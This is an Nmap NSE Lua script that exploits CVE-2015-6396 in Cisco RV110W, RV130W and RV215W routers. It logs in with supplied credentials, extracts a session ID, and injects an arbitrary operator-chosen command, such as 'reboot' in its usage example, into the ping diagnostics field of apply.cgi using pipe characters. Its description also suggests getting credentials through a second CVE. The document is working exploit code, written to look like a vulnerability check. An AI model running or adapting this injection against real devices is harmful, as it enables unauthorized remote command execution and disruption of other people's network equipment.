local shortport = require "shortport"
local http = require "http"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"

description = [[
Executes remote code by exploiting the CVE-2015-6396 vulnerability in the following Cisco devices:

- RV110W
- RV130W
- RV215W

The CLI command parser on the above Cisco devices allows local users to execute arbitrary shell commands
as an administrator via crafted parameters. Authentication is required. You can possibly get the device
credentials by exploiting the CVE-2014-0683 vulnerability on the device.

References:
* https://nvd.nist.gov/vuln/detail/CVE-2015-6396
]]

---
-- @usage nmap -sV --script http-vuln-cve2015-6396 --script-args user='cisco',pwd='cisco',cmd='reboot',scheme='https' <target>
-- @output
-- PORT   STATE SERVICE REASON
-- 443/tcp open  https   syn-ack
-- | http-vuln-cve2015-6396:
-- |   VULNERABLE:
-- |   Remote Code Execution in Cisco V110W, RV130W and RV215W (CVE-2015-6396)
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2015-6396
-- |       A remote code execution vulnerability exists on the CLI command parser which allows local users
-- |       to execute arbitrary shell commands as an administrator via crafted parameters.
-- |
-- |     Disclosure date: 2015-08-07
-- |     References:
-- |_      https://nvd.nist.gov/vuln/detail/CVE-2015-6396
-- @args http-vuln-cve2015-6396.user The user to use in request.
-- @args http-vuln-cve2015-6396.pwd The user's password.
-- @args http-vuln-cve2015-6396.user The command to execute.
-- @args http-vuln-cve2015-6396.scheme The supported scheme by the remote device.
---

author = {"Kostas Milonas"}
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "intrusive"}

portrule = shortport.http

action = function(host, port)
  local user = stdnse.get_script_args(SCRIPT_NAME .. '.user')
  local pwd = stdnse.get_script_args(SCRIPT_NAME .. '.pwd')
  local cmd = stdnse.get_script_args(SCRIPT_NAME .. '.cmd') or 'ping 8.8.8.8'
  local scheme = stdnse.get_script_args(SCRIPT_NAME .. '.scheme') or 'https'
  local uri = '/'
  local url = scheme .. '://' .. host.ip .. ':' .. port.number .. uri
  
  stdnse.debug1('Given user: %s', user)
  stdnse.debug1('Given pwd: %s', pwd)
  stdnse.debug1('Given cmd: %s', cmd)
  stdnse.debug1('Given scheme: %s', scheme)

  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  local vuln = {
    title = 'Remote Code Execution Cisco V110W, RV130W and RV215W (CVE-2015-6396)',
    state = vulns.STATE.NOT_VULN,
    description = [[
A remote code execution vulnerability exists on the CLI command parser which allows local users
to execute arbitrary shell commands as an administrator via crafted parameters.
    ]],
    IDS = {CVE = 'CVE-2015-6396'},
    references = {
      'https://nvd.nist.gov/vuln/detail/CVE-2015-6396'
    },
    dates = {
      disclosure = {year = '2015', month = '08', day = '07'},
    }
  }

  -- prepare headers for request to get the session id
  local options = {header={}}
  options['header']['Origin'] = url
  options['header']['Upgrade-Insecure-Requests'] = 1
  options['header']['Content-Type'] = 'application/x-www-form-urlencoded'
  options['header']['User-Agent'] = 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko)'
  options['header']['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
  options['header']['Referer'] = url
  options['header']['Accept-Encoding'] = 'gzip, deflate'
  options['header']['Accept-Language'] = 'en-US,en;q=0.9'
  options['header']['Cookie'] = 'SessionID='

  -- prepare data for request to get the session id
  local data = string.format('gui_action=&wait_time=0&pwd=%s&enc=1&submit_type=&user=%s&submit_button=login&change_action=&sel_lang=EN', pwd, user)

  -- make request to get the session id
  local response = http.post(host, port, uri .. 'login.cgi', options, nil, data)

  -- parse response to get the session id
  local session_id = response.body:match(';session_id=(.-)";')
  if (not session_id or session_id == '') or session_id:len() > 32 then
    stdnse.debug1('Checking the second pattern of the session_id...')
    session_id = response.body:match('var session_id = "(.-)";')
  end

  if (not session_id or session_id == '') or session_id:len() > 32 then
    stdnse.debug1('Session ID could not be found (login failed?).')
    return vuln_report:make_output(vuln)
  end

  stdnse.debug1('Got session ID: %s', session_id)

  -- prepare data for request to execute the cmd
  data = 'ping_size=64&submit_button=Diagnostics&traceroute_ip=&gui_action=&ping_ip=127.0.0.1&lookup_name=&ping_times=3+%7C' .. cmd .. '%7C&wait_time=4&submit_type=start_ping&change_action=gozila_cgi&commit=1'

  -- make request to execute the command
  local response = http.post(host, port, uri .. 'apply.cgi;session_id=' .. session_id, options, nil, data)

  if response.status and response.body then
    if response.status == 200 and not string.find(response.body, '<title>Login Page</title>') then
      vuln.state = vulns.STATE.VULN
    else
      stdnse.debug1('Command execution failed (invalid session ID?).')
    end
  end

  return vuln_report:make_output(vuln)
end
